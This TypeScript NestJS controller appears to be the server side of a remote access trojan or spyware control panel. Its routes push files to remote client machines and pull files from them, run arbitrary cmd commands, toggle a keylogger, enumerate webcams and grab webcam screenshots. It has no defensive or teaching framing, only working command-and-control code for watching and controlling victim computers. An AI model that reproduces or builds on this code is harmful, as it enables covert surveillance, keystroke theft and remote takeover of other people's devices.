import {
  Body,
  Controller,
  Get,
  Param,
  Post,
  Query,
  Req,
  UseGuards,
} from "@nestjs/common";
import { CONTROLLER_ROUTE } from "../route.constants";
import { FileToClientUseCase } from "../../application/events/file-to-client.use-case";
import { GetTasksUseCase } from "../../application/events/get-tasks.use-case";
import { SendCmdCommandToClientUseCase } from "../../application/events/send-cmd-command.use-case";
import { ClientPermissionRepository } from "@/src/repository/db/clientPermisions/clientPermission.repository";
import { ClientPermissionGuard } from "@/src/repository/db/clientPermisions/clientPermission.guard";
import { SendKeyloggerToClientUseCase } from "../../application/events/send-keylogger.use-case";
import {
  CamerasControllerDto,
  GetFileDto,
  SendCmdCommandToClientDto,
  SendFileToClientDto,
  SendKeyloggerToClientDto,
} from "./dto/controller.dto";
import { ControllerAuthorizationGuard } from "../../application/guards/ControllerAuthorization.guard";
import { CamerasUseCase } from "../../application/events/cameras.use-case";
import { MessageBotGuard } from "../../application/guards/MessageBot.guard";
import type { FastifyRequest } from "fastify";
import { UploadCdnUseCase } from "@/src/modules/cdn/application/upload-cdn.use-case";
import { ControllerRepository } from "@/src/repository/db/controller/controller.repository";


@UseGuards(ControllerAuthorizationGuard)
@Controller(CONTROLLER_ROUTE)
export class ControllerEvents {
  constructor(
    private readonly fileToClientUseCase: FileToClientUseCase,
    private readonly getTasksUseCase: GetTasksUseCase,
    private readonly sendCmdToClientUseCase: SendCmdCommandToClientUseCase,
    private readonly sendKeyloggerToClientUseCase: SendKeyloggerToClientUseCase,
    private readonly camerasUseCase: CamerasUseCase,
    private readonly uploadCdnUseCase: UploadCdnUseCase,
    private readonly controllerRepository: ControllerRepository,
  ) { }




  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/upload-file")
  async uploadFileToClient(
    @Param("controllerid") controllerid: string,
    @Body() body: SendFileToClientDto,
  ) {
    return await this.fileToClientUseCase.sendFileToClient(controllerid, body);
  }

  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/upload-large-file")
  async uploadLargeFileToClient(
    @Param("controllerid") controllerid: string,


  ) {

    console.log("uploadLargeFileToClient", controllerid);
    const activeclient = (
      await this.controllerRepository.getControllerById(controllerid)
    ).activeclient;

    if (!activeclient) return null
    const res = await this.uploadCdnUseCase.getUploadUrl(activeclient);
    console.log("res", res);
    return res
  }





  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/file")
  async getFileFromClient(
    @Param("controllerid") controllerid: string,
    @Body() body: GetFileDto,
  ) {
    return await this.fileToClientUseCase.getFileFromClient(controllerid, body);
  }

  @UseGuards(ClientPermissionGuard)
  @Get(":controllerid/tasks")
  async sendTasksToEvent(@Param("controllerid") controllerid: string) {
    return await this.getTasksUseCase.execute(controllerid);
  }

  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/cmd")
  async sendCmdCommandToClient(
    @Param("controllerid") controllerid: string,
    @Body() body: SendCmdCommandToClientDto,
  ) {
    return await this.sendCmdToClientUseCase.execute(controllerid, body);
  }

  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/keylogger")
  async sendKeyloggerToClient(
    @Param("controllerid") controllerid: string,
    @Body() body: SendKeyloggerToClientDto,
  ) {
    return await this.sendKeyloggerToClientUseCase.execute(
      controllerid,
      body.status,
    );
  }

  @UseGuards(ClientPermissionGuard, MessageBotGuard)
  @Post(":controllerid/cameras")
  async getCameras(
    @Param("controllerid") controllerid: string,
    @Body() body: CamerasControllerDto,
    @Req() req: FastifyRequest
  ) {


    return await this.camerasUseCase.getCameras(controllerid, req.headers["identifier"] as string);

  }

  @UseGuards(ClientPermissionGuard)
  @Get(":controllerid/camera-screenshot")
  async getScreenshotWebcam(
    @Param("controllerid") controllerid: string,
    @Req() req: FastifyRequest,
    @Query("webcamId") webcamId: string,

  ) {

    console.log("webcamId", webcamId);
    return await this.camerasUseCase.takeScreenshot(controllerid, webcamId);

  }


}
